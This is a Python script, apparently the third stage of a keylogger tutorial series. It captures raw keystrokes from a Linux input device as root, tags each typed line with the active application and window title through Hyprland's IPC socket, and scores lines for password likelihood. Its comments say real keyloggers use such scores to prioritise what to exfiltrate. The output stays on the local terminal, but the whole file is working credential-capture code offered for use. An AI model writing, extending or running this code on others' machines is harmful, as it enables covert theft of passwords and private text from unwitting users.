#!/usr/bin/env python3
"""
STAGE 3 — Context-Aware Keylogger
===================================
What's new vs Stage 2:
  - Detects WHICH application you are typing into
  - Tags every captured line with the active window title + app name
  - Uses /proc + hyprland socket to get focused window (Wayland-native)
  - Falls back to /proc/$(xdotool getactivewindow) if needed
  - Backspace fixed — silently eats previous char, no display artifact
  - Password heuristic — flags lines that look like passwords

This is what makes a keylogger actually dangerous:
  not just WHAT you typed, but WHERE you typed it.

Usage:
  sudo python3 stage3_context.py
"""

import evdev
import sys
import os
import subprocess
import json
import re
from datetime import datetime
from pathlib import Path

KEYBOARD_DEVICE = "/dev/input/event3"

RED     = "\033[91m"
YELLOW  = "\033[93m"
GREEN   = "\033[92m"
CYAN    = "\033[96m"
MAGENTA = "\033[95m"
BLUE    = "\033[94m"
BOLD    = "\033[1m"
DIM     = "\033[2m"
RESET   = "\033[0m"

KEYMAP = {
    "KEY_A": ("a","A"), "KEY_B": ("b","B"), "KEY_C": ("c","C"),
    "KEY_D": ("d","D"), "KEY_E": ("e","E"), "KEY_F": ("f","F"),
    "KEY_G": ("g","G"), "KEY_H": ("h","H"), "KEY_I": ("i","I"),
    "KEY_J": ("j","J"), "KEY_K": ("k","K"), "KEY_L": ("l","L"),
    "KEY_M": ("m","M"), "KEY_N": ("n","N"), "KEY_O": ("o","O"),
    "KEY_P": ("p","P"), "KEY_Q": ("q","Q"), "KEY_R": ("r","R"),
    "KEY_S": ("s","S"), "KEY_T": ("t","T"), "KEY_U": ("u","U"),
    "KEY_V": ("v","V"), "KEY_W": ("w","W"), "KEY_X": ("x","X"),
    "KEY_Y": ("y","Y"), "KEY_Z": ("z","Z"),
    "KEY_1": ("1","!"), "KEY_2": ("2","@"), "KEY_3": ("3","#"),
    "KEY_4": ("4","$"), "KEY_5": ("5","%"), "KEY_6": ("6","^"),
    "KEY_7": ("7","&"), "KEY_8": ("8","*"), "KEY_9": ("9","("),
    "KEY_0": ("0",")"),
    "KEY_MINUS":      ("-","_"),  "KEY_EQUAL":      ("=","+"),
    "KEY_LEFTBRACE":  ("[","{"),  "KEY_RIGHTBRACE": ("]","}"),
    "KEY_SEMICOLON":  (";",":"),  "KEY_APOSTROPHE": ("'",'"'),
    "KEY_GRAVE":      ("`","~"),  "KEY_BACKSLASH":  ("\\","|"),
    "KEY_COMMA":      (",","<"),  "KEY_DOT":        (".",">"),
    "KEY_SLASH":      ("/","?"),  "KEY_SPACE":      (" "," "),
    "KEY_TAB":        ("\t","\t"),
}

SPECIAL_KEYS = {
    "KEY_ENTER":     "ENTER",
    "KEY_BACKSPACE": "BACKSPACE",
    "KEY_ESC":       "ESC",
    "KEY_TAB":       "TAB",
    "KEY_UP":        "↑", "KEY_DOWN": "↓",
    "KEY_LEFT":      "←", "KEY_RIGHT": "→",
    "KEY_DELETE":    "DEL",
    "KEY_F1":  "F1",  "KEY_F2":  "F2",  "KEY_F3":  "F3",
    "KEY_F4":  "F4",  "KEY_F5":  "F5",  "KEY_F6":  "F6",
    "KEY_F7":  "F7",  "KEY_F8":  "F8",  "KEY_F9":  "F9",
    "KEY_F10": "F10", "KEY_F11": "F11", "KEY_F12": "F12",
}

MODIFIER_KEYS = {
    "KEY_LEFTSHIFT", "KEY_RIGHTSHIFT",
    "KEY_LEFTCTRL",  "KEY_RIGHTCTRL",
    "KEY_LEFTALT",   "KEY_RIGHTALT",
    "KEY_LEFTMETA",  "KEY_RIGHTMETA",
    "KEY_CAPSLOCK",
}

BANNER = f"""
{RED}{BOLD}
 ██████╗████████╗ █████╗  ██████╗ ███████╗    ██████╗
██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔════╝    ╚════██╗
╚█████╗    ██║   ███████║██║  ███╗█████╗        █████╔╝
 ╚═══██╗   ██║   ██╔══██║██║   ██║██╔══╝        ╔══██║
██████╔╝   ██║   ██║  ██║╚██████╔╝███████╗      █████╔╝
╚═════╝    ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝      ╚════╝
{RESET}
{DIM}  STAGE 3 — Context-Aware Capture | app + window tracking{RESET}
{RED}  ──────────────────────────────────────────────────────────{RESET}
  {GREEN}Every captured line is tagged with:{RESET}
    • Active application name
    • Window title (browser tab, terminal cwd, etc.)
    • Timestamp
    • Password likelihood score
{RED}  ──────────────────────────────────────────────────────────{RESET}
"""

# ── Window detection (Hyprland native via IPC socket) ───────────────────────

def get_hyprland_active_window():
    """Query Hyprland IPC socket for the currently focused window."""
    try:
        sig = None

        # Try env var first (works if sudo -E preserves env)
        sig = os.environ.get("HYPRLAND_INSTANCE_SIGNATURE")

        # Search both common socket locations
        if not sig:
            for base in [Path("/run/user/1000/hypr"), Path("/tmp/hypr")]:
                if base.exists():
                    entries = list(base.iterdir())
                    if entries:
                        sig = entries[0].name
                        break

        if not sig:
            return None, None

        # Find the actual socket file
        socket_path = None
        for base in [f"/run/user/1000/hypr/{sig}", f"/tmp/hypr/{sig}"]:
            candidate = f"{base}/.socket.sock"
            if Path(candidate).exists():
                socket_path = candidate
                break

        if not socket_path:
            return None, None

        # Run as real user (uid 1000) not root — user owns the socket
        result = subprocess.run(
            ["sudo", "-u", "#1000", "sh", "-c",
             f'echo -n "j/activewindow" | socat - "UNIX-CONNECT:{socket_path}"'],
            capture_output=True, text=True, timeout=1
        )

        if result.returncode != 0 or not result.stdout.strip():
            return None, None

        data = json.loads(result.stdout)
        app   = data.get("class", "unknown")
        title = data.get("title", "unknown")
        return app, title

    except Exception:
        return None, None


def get_active_window_procfs():
    """
    Fallback: read /proc to find the foreground process.
    Looks for processes with a controlling terminal that are in foreground process group.
    """
    try:
        # Find which process owns the active TTY
        result = subprocess.run(
            ["ps", "-eo", "pid,stat,comm", "--no-headers"],
            capture_output=True, text=True, timeout=2
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            if len(parts) >= 3 and "+" in parts[1]:  # "+" means foreground
                return parts[2], f"pid:{parts[0]}"
        return "unknown", "unknown"
    except Exception:
        return "unknown", "unknown"


def get_active_window():
    """Get active window info — try Hyprland IPC first, fallback to procfs."""
    app, title = get_hyprland_active_window()
    if app:
        return app, title
    return get_active_window_procfs()


# ── Password heuristic ───────────────────────────────────────────────────────

def password_score(text):
    """
    Score likelihood that a captured string is a password (0-100).
    Real keyloggers use this to prioritize which captures to exfil first.
    """
    if len(text) < 6:
        return 0

    score = 0
    if any(c.isupper() for c in text):   score += 20
    if any(c.islower() for c in text):   score += 20
    if any(c.isdigit() for c in text):   score += 20
    if any(c in "!@#$%^&*()_+-=[]{}|;':\",./<>?" for c in text): score += 30
    if len(text) >= 8:                   score += 10

    return score


def password_label(score):
    if score >= 80:
        return f"{RED}{BOLD}⚠ HIGH LIKELIHOOD PASSWORD{RESET}"
    elif score >= 50:
        return f"{YELLOW}~ possible password{RESET}"
    elif score >= 30:
        return f"{DIM}low password likelihood{RESET}"
    return ""


# ── Main ─────────────────────────────────────────────────────────────────────

def print_captured(text_buffer, app, title):
    """Print the captured line box with full context."""
    captured  = "".join(text_buffer)
    ts        = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    pscore    = password_score(captured)
    plabel    = password_label(pscore)

    print(f"\n{RED}  ╔══ CAPTURED ══════════════════════════════════════════════{RESET}")
    print(f"{RED}  ║{RESET}  {DIM}time :{RESET}  {ts}")
    print(f"{RED}  ║{RESET}  {DIM}app  :{RESET}  {BOLD}{CYAN}{app}{RESET}")
    print(f"{RED}  ║{RESET}  {DIM}title:{RESET}  {BLUE}{title[:60]}{RESET}")
    print(f"{RED}  ║{RESET}  {DIM}text :{RESET}  {BOLD}{YELLOW}{captured}{RESET}")
    if plabel:
        print(f"{RED}  ║{RESET}  {DIM}score:{RESET}  {plabel}  {DIM}({pscore}/100){RESET}")
    print(f"{RED}  ╚══════════════════════════════════════════════════════════{RESET}\n")


def main():
    print(BANNER)

    try:
        device = evdev.InputDevice(KEYBOARD_DEVICE)
    except PermissionError:
        print(f"{RED}[ERROR]{RESET} Run with: {BOLD}sudo python3 stage3_context.py{RESET}")
        sys.exit(1)

    # Check socat is available (needed for Hyprland IPC)
    socat_ok = subprocess.run(["which", "socat"], capture_output=True).returncode == 0
    if not socat_ok:
        print(f"{YELLOW}[WARN]{RESET} socat not found — window detection limited.")
        print(f"{DIM}       Install with: sudo pacman -S socat{RESET}\n")

    # Initial window detection test
    app, title = get_active_window()
    print(f"  {DIM}Window detection test:{RESET}")
    print(f"  {GREEN}app  :{RESET} {app}")
    print(f"  {GREEN}title:{RESET} {title}")
    print(f"\n{BOLD}{GREEN}  ── LIVE FEED ──────────────────────────────────────────{RESET}\n")

    shift_held  = False
    caps_lock   = False
    ctrl_held   = False
    text_buffer = []
    event_count = 0
    current_app, current_title = app, title

    try:
        for event in device.read_loop():
            if event.type != evdev.ecodes.EV_KEY:
                continue

            key     = evdev.categorize(event)
            keyname = key.keycode if isinstance(key.keycode, str) else key.keycode[0]
            ts      = datetime.now().strftime("%H:%M:%S.%f")[:-3]

            # ── Modifier tracking ──
            if keyname in ("KEY_LEFTSHIFT", "KEY_RIGHTSHIFT"):
                shift_held = (event.value != 0)
                continue
            if keyname in ("KEY_LEFTCTRL", "KEY_RIGHTCTRL"):
                ctrl_held = (event.value != 0)
                continue
            if keyname in ("KEY_LEFTALT", "KEY_RIGHTALT",
                           "KEY_LEFTMETA", "KEY_RIGHTMETA"):
                continue

            if keyname == "KEY_CAPSLOCK" and event.value == 1:
                caps_lock = not caps_lock
                print(f"  {DIM}[{ts}]{RESET}  {YELLOW}[CAPSLOCK {'ON' if caps_lock else 'OFF'}]{RESET}")
                continue

            if event.value not in (1, 2):  # only press and repeat
                continue

            # ── Refresh active window on each keypress ──
            # (only re-query every ~10 keys for performance)
            if event_count % 10 == 0:
                current_app, current_title = get_active_window()

            event_count += 1

            # ── Character keys ──
            if keyname in KEYMAP and not ctrl_held:
                normal, shifted = KEYMAP[keyname]
                effective_shift = shift_held ^ caps_lock
                char = shifted if effective_shift else normal

                text_buffer.append(char)

                display = char.replace(" ", "·").replace("\t", "→")
                shift_tag = f" {YELLOW}[SHIFT]{RESET}" if shift_held else ""

                print(
                    f"  {DIM}[{ts}]{RESET}  "
                    f"{GREEN}▶{RESET} "
                    f"{BOLD}{keyname:<22}{RESET} → "
                    f"{BOLD}{GREEN}{display}{RESET}{shift_tag}"
                )

            # ── Special keys ──
            elif keyname in SPECIAL_KEYS:
                label = SPECIAL_KEYS[keyname]

                if keyname == "KEY_BACKSPACE":
                    if text_buffer:
                        removed = text_buffer.pop()
                        print(f"  {DIM}[{ts}]{RESET}  {RED}⌫ BACKSPACE{RESET}  {DIM}(removed: '{removed}'){RESET}")
                    else:
                        print(f"  {DIM}[{ts}]{RESET}  {RED}⌫ BACKSPACE{RESET}  {DIM}(buffer empty){RESET}")

                elif keyname == "KEY_ENTER":
                    print(f"  {DIM}[{ts}]{RESET}  {CYAN}↵ ENTER{RESET}")
                    if text_buffer:
                        print_captured(text_buffer, current_app, current_title)
                    text_buffer = []
                    # Refresh window after enter (user likely switched context)
                    current_app, current_title = get_active_window()

                elif keyname == "KEY_TAB":
                    text_buffer.append("\t")
                    print(f"  {DIM}[{ts}]{RESET}  {BLUE}→ TAB{RESET}")

                else:
                    print(f"  {DIM}[{ts}]{RESET}  {DIM}[{label}]{RESET}")

            # ── Ctrl combos ──
            elif ctrl_held:
                print(f"  {DIM}[{ts}]{RESET}  {MAGENTA}[CTRL+{keyname.replace('KEY_','')}]{RESET}")

            # ── Show live buffer ──
            buf_display = "".join(text_buffer).replace("\t", "→")
            print(
                f"  {DIM}╰─ [{current_app}] buffer:{RESET} "
                f"{BOLD}{CYAN}{buf_display}{RESET}{CYAN}█{RESET}",
                end="\r"
            )

    except KeyboardInterrupt:
        captured = "".join(text_buffer)
        print(f"\n\n{RED}  ──────────────────────────────────────────{RESET}")
        print(f"  {BOLD}Session ended.{RESET} {event_count} keypresses captured.")
        if captured:
            print(f"  {BOLD}Unsent buffer:{RESET} {YELLOW}{captured}{RESET}")
            pscore = password_score(captured)
            if pscore > 30:
                print(f"  {password_label(pscore)}")
        print(f"{RED}  ──────────────────────────────────────────{RESET}\n")


if __name__ == "__main__":
    main()
